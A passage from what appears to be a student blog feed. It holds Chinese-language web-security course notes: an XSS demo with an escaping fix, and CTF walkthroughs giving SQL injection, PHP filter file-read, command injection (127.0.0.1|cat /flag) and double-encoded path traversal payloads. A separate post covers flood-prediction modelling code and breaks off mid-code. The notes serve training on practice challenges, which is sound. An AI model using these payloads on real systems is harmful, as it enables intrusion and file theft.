class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;window.location=&#x27;https://www.yuanshen.com&#x27;;&quot;</span>&gt;</span>XSS持久型攻击——原神，启动！<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>服务器将用户提交的内容存储在 <code>dataset</code>  列表中，没有进行任何过滤或编码。</li>\n<li>当页面渲染时，所有评论（包括恶意脚本）都会被直接输出到 HTML 页面中，导致恶意脚本在用户浏览器中执行。</li>\n</ul>\n<h3 id=\"防御方法\"><a class=\"anchor\" href=\"#防御方法\">#</a> 防御方法</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, request, escape</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_wtf.csrf <span class=\"keyword\">import</span> CSRFProtect</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.secret_key = <span class=\"string\">&#x27;your_secret_key&#x27;</span></span><br><span class=\"line\">csrf = CSRFProtect(app)</span><br><span class=\"line\"></span><br><span class=\"line\">dataset = [<span class=\"string\">&quot;BIT网络安全课程真有趣&quot;</span>, <span class=\"string\">&quot;Web安全演示实验打卡&quot;</span>, <span class=\"string\">&quot;祝同学们都能取得好成绩!&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span>, methods=[<span class=\"string\">&quot;GET&quot;</span>, <span class=\"string\">&quot;POST&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    query = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.form.get(<span class=\"string\">&quot;submit&quot;</span>) == <span class=\"string\">&quot;提交新评论&quot;</span>:</span><br><span class=\"line\">            comment = escape(request.form.get(<span class=\"string\">&quot;newComment&quot;</span>).strip())</span><br><span class=\"line\">            <span class=\"keyword\">if</span> comment:</span><br><span class=\"line\">                dataset.append(comment)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> request.method == <span class=\"string\">&quot;GET&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.args.get(<span class=\"string\">&quot;submit&quot;</span>) == <span class=\"string\">&quot;提交&quot;</span>:</span><br><span class=\"line\">            query = escape(request.args.get(<span class=\"string\">&quot;content&quot;</span>).strip())</span><br><span class=\"line\">            <span class=\"keyword\">if</span> query:</span><br><span class=\"line\">                sub_dataset = [x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> dataset <span class=\"keyword\">if</span> query <span class=\"keyword\">in</span> x]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, query=query, comments=sub_dataset)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, query=query, comments=dataset)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>输入过滤和编码</strong>：对用户输入的数据进行 HTML 转义，防止恶意脚本的执行。</li>\n<li><strong>使用 Flask 的 <code>escape</code>  函数</strong>：对用户输入的内容进行 HTML 转义，如上代码所示，使用 <code>escape</code>  函数对 <code>query</code>  和 <code>comment</code>  进行处理。</li>\n<li><strong>内容安全策略（CSP）</strong>：配置 HTTP 响应头，限制浏览器只执行可信任的脚本。</li>\n</ul>\n<h1 id=\"实战\"><a class=\"anchor\" href=\"#实战\">#</a> 实战</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbg==\">BUUCTF</span></p>\n<h2 id=\"极客大挑战-2019easysql\"><a class=\"anchor\" href=\"#极客大挑战-2019easysql\">#</a> [极客大挑战 2019] EasySQL</h2>\n<ul>\n<li>admin' or 1=1 #</li>\n<li>密码随便写</li>\n</ul>\n<h2 id=\"havefun\"><a class=\"anchor\" href=\"#havefun\">#</a> Havefun</h2>\n<ul>\n<li>查看原代码: <code>if cat=dog</code>  输出原代码</li>\n<li><code>/?cat=dog</code></li>\n</ul>\n<h2 id=\"include\"><a class=\"anchor\" href=\"#include\">#</a> Include</h2>\n<ul>\n<li>点击<strong> tips</strong></li>\n<li><strong>include</strong>: 文件包含</li>\n<li><code>php://filter/read=convert.base64-encode/resource=要读取的文件</code></li>\n<li>Hackbar: <code>php://filter/read=convert.base64-encode/resource=flag.php</code></li>\n<li>最终输入 <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></li>\n</ul>\n<h2 id=\"actf2020-新生赛exec1\"><a class=\"anchor\" href=\"#actf2020-新生赛exec1\">#</a> [ACTF2020 新生赛] Exec1</h2>\n<ul>\n<li>ping  <code>127.0.0.1</code></li>\n<li><code>127.0.0.1 |ls /</code></li>\n<li><code>127.0.0.1|ls /flag</code></li>\n<li><code>127.0.0.1|cat /flag</code></li>\n</ul>\n<h2 id=\"actf2020-新生赛backupfile\"><a class=\"anchor\" href=\"#actf2020-新生赛backupfile\">#</a> [ACTF2020 新生赛] BackupFile</h2>\n<h3 id=\"备份文件后缀名\"><a class=\"anchor\" href=\"#备份文件后缀名\">#</a> 备份文件后缀名：</h3>\n<ul>\n<li><code>.git</code></li>\n<li><code>.svn</code></li>\n<li><code>.swp</code></li>\n<li><code>.~</code></li>\n<li><code>.bak</code> ☆</li>\n<li><code>.bash_history</code></li>\n<li><code>.bkf</code></li>\n</ul>\n<h3 id=\"indexphpbak\"><a class=\"anchor\" href=\"#indexphpbak\">#</a> /index.php.bak</h3>\n<p>打开下载到的东西后，<strong>代码审计</strong></p>\n<p>传值， <code>/?key=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</code> , 报错，审计代码！</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$key</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>故传值: <code>/?key=123</code></p>\n<h2 id=\"hctf-2018warmup\"><a class=\"anchor\" href=\"#hctf-2018warmup\">#</a> [HCTF 2018]WarmUp</h2>\n<ul>\n<li>\n<p>查看原代码 —— 注释 <code>source.php</code></p>\n</li>\n<li>\n<p>查看代码里的判断语句:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (! <span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">     &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">     &amp;&amp; emmm::<span class=\"title function_ invoke__\">checkFile</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\"> )</span><br></pre></td></tr></table></figure></p>\n<p>文件包含漏洞</p>\n</li>\n<li>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>code￼<span class=\"token number\">24</span><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>取 <span class=\"token string backtick-quoted-string\">`page`</span>，然后问号加在其末尾，找出问号第一次出现的位置</pre></td></tr></table></figure></li>\n<li>\n<p>假如 file=source.php?../../flag?</p>\n</li>\n<li>\n<p>问号一定要传，但是对其进行了两次 <code>url</code>  解码，所以需要进行两次加码。%253F</p>\n</li>\n<li>\n<p><strong>file=source.php%253F../../ffffllllaaaagggg</strong></p>\n</li>\n<li>\n<p>一直到<strong><span class=\"exturl\" data-url=\"aHR0cDovLzYzZGI5MWE0LTZhZjktNDQ3Ni1hYTBlLTM5NjlkM2QwZTNiZS5ub2RlNS5idXVvai5jbjo4MS8/ZmlsZT1zb3VyY2UucGhwJTI1M0YuLi8uLi8uLi8uLi8uLi9mZmZmbGxsbGFhYWFnZ2dn\"> http://63db91a4-6af9-4476-aa0e-3969d3d0e3be.node5.buuoj.cn:81/?file=source.php%3F../../../../../ffffllllaaaagggg</span></strong></p>\n</li>\n<li>\n<p><strong>?file=source.php%253F../../../../../ffffllllaaaagggg</strong></p>\n</li>\n</ul>\n<h1 id=\"附加-攻防世界\"><a class=\"anchor\" href=\"#附加-攻防世界\">#</a> 附加 攻防世界</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL2hvbWUvaW5kZXg=\">攻防世界</span>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL2hvbWUvaW5kZXg=\">https://adworld.xctf.org.cn/home/index</span></p>\n<h2 id=\"view_source\"><a class=\"anchor\" href=\"#view_source\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL2NoYWxsZW5nZXMvbGlzdA==\">view_source</span></h2>\n<ul>\n<li>点击获取在线场景</li>\n<li>F12</li>\n</ul>\n<h2 id=\"get_post\"><a class=\"anchor\" href=\"#get_post\">#</a> get_post</h2>\n<ul>\n<li>hackbar</li>\n<li>get——?a=x</li>\n</ul>\n<h2 id=\"robots\"><a class=\"anchor\" href=\"#robots\">#</a> robots</h2>\n<p>obots 协议也称爬虫协议、爬虫规则等，是指<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkQlOTElRTclQUIlOTkvMTU1NzIyP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r\">网站</span>可建立一个 robots.txt 文件来告诉<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTAlOUMlRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEUvMTA0ODEyP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r\">搜索引擎</span>哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取 robots.txt 文件来识别这个页面是否允许被抓取。但是，这个 robots 协议不是防火墙，也没有<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkMlQkElRTUlODglQjYlRTYlODklQTclRTglQTElOEMlRTUlOEElOUIvNTUxODA2MzY/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=\">强制执行力</span>，搜索引擎完全可以忽视 robots.txt<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTYlODclRTQlQkIlQjYlRTUlOEUlQkIvMTg5NzM5Nzg/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=\"> 文件去</span>抓取网页的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkYlQUIlRTclODUlQTcvMzI3MDM4P2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r\">快照</span><strong>。</strong> [5] 如果想单独定义搜索引擎的漫游器访问<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUQlOTAlRTclOUIlQUUlRTUlQkQlOTUvNDcyODAyNj9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==\">子目录</span>时的行为，那么可以将自定的设置合并到<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQTAlQjklRTclOUIlQUUlRTUlQkQlOTUvNjA2MTMzMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==\">根目录</span>下的 robots.txt，或者使用 robots<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlODMlRTYlOTUlQjAlRTYlOEQlQUUvMTk0NjA5MD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==\"> 元数据</span>（Metadata，又称元数据）。</p>\n<ul>\n<li>直接 /robots.txt</li>\n</ul>\n<h2 id=\"backup\"><a class=\"anchor\" href=\"#backup\">#</a> backup</h2>\n<h3 id=\"备份文件后缀名-2\"><a class=\"anchor\" href=\"#备份文件后缀名-2\">#</a> 备份文件后缀名：</h3>\n<ul>\n<li><code>.git</code></li>\n<li><code>.svn</code></li>\n<li><code>.swp</code></li>\n<li><code>.~</code></li>\n<li><code>.bak</code> ☆</li>\n<li><code>.bash_history</code></li>\n<li><code>.bkf</code></li>\n</ul>\n<h2 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> cookie</h2>\n<ul>\n<li>应用 / Application</li>\n<li>Cookies</li>\n<li>看 look-here</li>\n<li>response？</li>\n<li>网络 / Network</li>\n<li>重新加载</li>\n<li>点击 php, 看到 flag</li>\n</ul>\n<h2 id=\"disabled_button\"><a class=\"anchor\" href=\"#disabled_button\">#</a> disabled_button</h2>\n<ul>\n<li>F12，指针指过去，发现是 post</li>\n<li>右键，以 html 格式修改，删除 disable.</li>\n</ul>\n<h1 id=\"class-over\"><a class=\"anchor\" href=\"#class-over\">#</a> Class Over!</h1>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/bit/%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%A8%A1%E2%80%94%E2%80%94%E6%B4%AA%E6%B0%B4%E9%A2%84%E6%B5%8B/",
            "url": "https://enjundu.github.io/bit/%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%A8%A1%E2%80%94%E2%80%94%E6%B4%AA%E6%B0%B4%E9%A2%84%E6%B5%8B/",
            "title": "亚太数模——洪水",
            "date_published": "2024-07-04T14:49:23.000Z",
            "content_html": "<p><strong>改前版本 直接从 word 转的  凑合着看吧</strong></p>\n<h1 id=\"代码解析\"><a class=\"anchor\" href=\"#代码解析\">#</a> 代码解析</h1>\n<h2 id=\"before-problem-数据传入与预处理全局函数设置\"><a class=\"anchor\" href=\"#before-problem-数据传入与预处理全局函数设置\">#</a> Before Problem -- 数据传入与预处理，全局函数设置</h2>\n<h3 id=\"导入必要的库\"><a class=\"anchor\" href=\"#导入必要的库\">#</a> 导入必要的库</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> statsmodels.api <span class=\"keyword\">as</span> sm</span><br><span class=\"line\"><span class=\"keyword\">import</span> statsmodels.formula.api <span class=\"keyword\">as</span> smf</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LinearRegression</span><br><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.preprocessing <span class=\"keyword\">import</span> StandardScaler</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> r2_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> train_test_split</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> accuracy_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> DecisionTreeRegressor</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LogisticRegression</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn <span class=\"keyword\">import</span> preprocessing</span><br><span class=\"line\"><span class=\"keyword\">import</span> joblib</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> RandomForestRegressor</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LogisticRegression</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.decomposition <span class=\"keyword\">import</span> PCA</span><br><span class=\"line\">plt.rcParams[<span class=\"string\">&#x27;font.sans-serif&#x27;</span>] = [<span class=\"string\">u&#x27;simHei&#x27;</span>]   <span class=\"comment\"># 显示中文</span></span><br><span class=\"line\">plt.rcParams[<span class=\"string\">&#x27;axes.unicode_minus&#x27;</span>] = <span class=\"literal\">False</span>      <span class=\"comment\"># 解决负号问题</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据读入\"><a class=\"anchor\" href=\"#数据读入\">#</a> 数据读入</h3>\n<h4 id=\"从traincsv读入train数据\"><a class=\"anchor\" href=\"#从traincsv读入train数据\">#</a> 从 train.csv 读入 train 数据</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据预处理\"><a class=\"anchor\" href=\"#数据预处理\">#</a> 数据预处理</h3>\n<p>id 列对于数据分析没有用处，直接清洗掉这一列</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p>经检验，原始数据中不存在缺失值与明显的离群点，因此在这里全部保留</p>\n<p>将 ' 洪水概率 ' 设置为目标变量，将原始数据划分为 X，y</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">y=np.array(y)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数据相关性简要分析\"><a class=\"anchor\" href=\"#数据相关性简要分析\">#</a> 数据相关性简要分析</h3>\n<p>利用不同指标与洪水概率的相关系数来衡量这些指标与洪水概率的关系</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]=y</span><br><span class=\"line\">heat_corr = train_data.corr()[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">heat_corr_sorted=heat_corr.sort_values(ascending=<span class=\"literal\">False</span>)</span><br><span class=\"line\">heat_corr=heat_corr[:-<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure></p>\n<p>可视化相关系数图</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">heat_corr.plot(kind=<span class=\"string\">&#x27;bar&#x27;</span>, color=<span class=\"string\">&#x27;skyblue&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;不同因素对洪水概率的影响&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;影响因素&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;corr&#x27;</span>)</span><br><span class=\"line\">plt.grid(axis=<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"建立三个水平的指标集\"><a class=\"anchor\" href=\"#建立三个水平的指标集\">#</a> 建立三个水平的指标集</h3>\n<pre><code>20： 全指标\n\n10：半指标\n\n5：核心指标\n\n划分依据: 相关系数大小\n</code></pre>\n<p>根据语义与实际情况考虑，先剔除如下的两个属性形成 18 个指标的属性集</p>\n<pre><code>湿地损失、无效防灾\n</code></pre>\n<p>进一步建立精简指标集，剔除如下的指标集：</p>\n<pre><code>湿地损失、无效防灾、农业实践、排水系统、规划不足、季风强度、政策因素、流域、基础设施恶化\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X.columns</span><br></pre></td></tr></table></figure></p>\n<pre><code>Index(['季风强度', '地形排水', '河流管理', '森林砍伐', '城市化', '气候变化', '大坝质量', '淤积', '农业实践',\n       '侵蚀', '无效防灾', '排水系统', '海岸脆弱性', '滑坡', '流域', '基础设施恶化', '人口得分', '湿地损失',\n       '规划不足', '政策因素'],\n      dtype='object')\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X_COPY=X</span><br><span class=\"line\">eighteen_columns=X.drop(columns=[<span class=\"string\">&#x27;湿地损失&#x27;</span>,<span class=\"string\">&#x27;无效防灾&#x27;</span>])</span><br><span class=\"line\">eleven_columns=X.drop(columns=[<span class=\"string\">&#x27;湿地损失&#x27;</span>,<span class=\"string\">&#x27;无效防灾&#x27;</span>,<span class=\"string\">&#x27;农业实践&#x27;</span>,<span class=\"string\">&#x27;排水系统&#x27;</span>,<span class=\"string\">&#x27;规划不足&#x27;</span>,<span class=\"string\">&#x27;季风强度&#x27;</span>,<span class=\"string\">&#x27;政策因素&#x27;</span>,<span class=\"string\">&#x27;流域&#x27;</span>,<span class=\"string\">&#x27;基础设施恶化&#x27;</span>])</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"利用过滤法获取指标集\"><a class=\"anchor\" href=\"#利用过滤法获取指标集\">#</a> 利用过滤法获取指标集</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.feature_selection <span class=\"keyword\">import</span> SelectKBest,f_classif</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ten_columns=[<span class=\"string\">&#x27;淤积&#x27;</span>, <span class=\"string\">&#x27;滑坡&#x27;</span>, <span class=\"string\">&#x27;城市化&#x27;</span>, <span class=\"string\">&#x27;海岸脆弱性&#x27;</span>, <span class=\"string\">&#x27;气候变化&#x27;</span>, <span class=\"string\">&#x27;侵蚀&#x27;</span>, <span class=\"string\">&#x27;人口得分&#x27;</span>, <span class=\"string\">&#x27;大坝质量&#x27;</span>, <span class=\"string\">&#x27;河流管理&#x27;</span>, <span class=\"string\">&#x27;地形排水&#x27;</span>]</span><br><span class=\"line\">X_selected = X[ten_columns]</span><br><span class=\"line\">selector = SelectKBest(score_func=f_classif, k=<span class=\"number\">4</span>)</span><br><span class=\"line\">X_new = selector.fit_transform(X_selected, y)</span><br><span class=\"line\">selected_features_indices = selector.get_support(indices=<span class=\"literal\">True</span>)</span><br><span class=\"line\">selected_features = X_selected.columns[selected_features_indices]</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">selected_features=<span class=\"built_in\">list</span>(selected_features)</span><br><span class=\"line\">selected_features.append(<span class=\"string\">&#x27;森林砍伐&#x27;</span>)</span><br><span class=\"line\">five_columns=selected_features</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"全局函数设置\"><a class=\"anchor\" href=\"#全局函数设置\">#</a> 全局函数设置</h3>\n<p>建立余弦相似度的计算函数</p>\n<pre><code>cosine(a,b)\n\ninput : 向量A，B\n\noutput : 两个向量的余弦相似度 0-1\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cosine</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">    dot_product = np.dot(a, b)</span><br><span class=\"line\">    norm_a = np.linalg.norm(a)</span><br><span class=\"line\">    norm_b = np.linalg.norm(b)</span><br><span class=\"line\">    cosine_similarity = dot_product / (norm_a * norm_b) </span><br><span class=\"line\">    <span class=\"keyword\">return</span> cosine_similarity</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"划分训练集与测试集\"><a class=\"anchor\" href=\"#划分训练集与测试集\">#</a> 划分训练集与测试集</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"problem-one-全指标集数学模型建立与求解\"><a class=\"anchor\" href=\"#problem-one-全指标集数学模型建立与求解\">#</a> Problem ONE -- 全指标集数学模型建立与求解</h2>\n<pre><code>利用多种数学模型拟合本问题，并得出不同指标的权重\n多元线性回归\n梯度提升树\n决策树\n随机森林模型\n</code></pre>\n<h3 id=\"模型一-线性回归\"><a class=\"anchor\" href=\"#模型一-线性回归\">#</a> 模型一 线性回归</h3>\n<pre><code>原理：利用标准方程法求解线性方程组\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span 